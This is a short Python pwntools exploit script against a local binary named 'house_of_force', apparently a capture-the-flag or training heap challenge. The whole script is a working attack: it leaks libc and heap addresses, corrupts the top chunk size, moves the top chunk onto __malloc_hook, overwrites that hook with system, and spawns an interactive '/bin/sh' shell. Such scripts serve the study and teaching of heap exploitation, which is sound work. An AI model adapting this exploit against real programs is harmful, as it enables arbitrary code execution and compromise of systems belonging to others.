from pwn import *
r = process("./house_of_force")
libc = ELF("./libc.so.6")

def malloc(size, data):
    r.sendline(b"1")
    r.sendlineafter(b"size:",str(size).encode())
    r.sendlineafter(b"data:",data)

r.recvuntil(b"@ ")
libc.address =  int(r.recv(14),16) - 0x80970

r.recvuntil(b"@ ")
top_chunk = int(r.recvline().strip(),16) + 0xb0

# Overwrite size of the top chunk
malloc(1,b"A"*24 + b"\xff"*8)

# Place new top chunk
evil_size = libc.symbols['__malloc_hook'] - top_chunk - 0x20
malloc(evil_size,b"")

# Overwrite __malloc_hook 
malloc(8,p64(libc.symbols['system']))

# Call system("/bin/sh")
malloc(next(libc.search("/bin/sh")),b"")

r.interactive()


